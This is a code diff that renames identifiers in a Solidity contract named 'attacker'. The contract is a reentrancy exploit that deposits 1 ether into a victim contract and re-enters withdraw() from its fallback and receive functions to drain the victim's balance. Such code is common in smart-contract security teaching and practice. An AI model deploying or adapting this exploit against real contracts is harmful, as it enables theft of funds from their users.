@@ -8,14 +8,14 @@ interface Ivictim {
 }
 
 contract attacker {
-    Ivictim public bobolon;
+    Ivictim public victimContract;
 
-    address immutable loko;
+    address immutable victimAddress;
     address immutable owner;
 
-    constructor(address _bobolon) {
-        bobolon = Ivictim(_bobolon);
-        loko = _bobolon;
+    constructor(address _victimContract) {
+        victimContract = Ivictim(_victimContract);
+        victimAddress = _victimContract;
         owner = msg.sender;
     }
 
@@ -25,22 +25,22 @@ contract attacker {
     }
 
     fallback() external payable {
-        chekBalance(loko);
+        chekBalance(victimAddress);
     }
 
     receive() external payable {
-        chekBalance(loko);
+        chekBalance(victimAddress);
     }
 
     function hack() external payable onlyOwner {
         require(msg.value >= 1 * 10**18, "Wrong value, it must be >= 1");
-        bobolon.deposit{value: 1 * 10**18}();
-        bobolon.withdraw();
+        victimContract.deposit{value: 1 * 10**18}();
+        victimContract.withdraw();
     }
 
     function chekBalance(address _victim) internal {
         if (_victim.balance >= 1 * 10**18) {
-            bobolon.withdraw();
+            victimContract.withdraw();
         }
     }
 
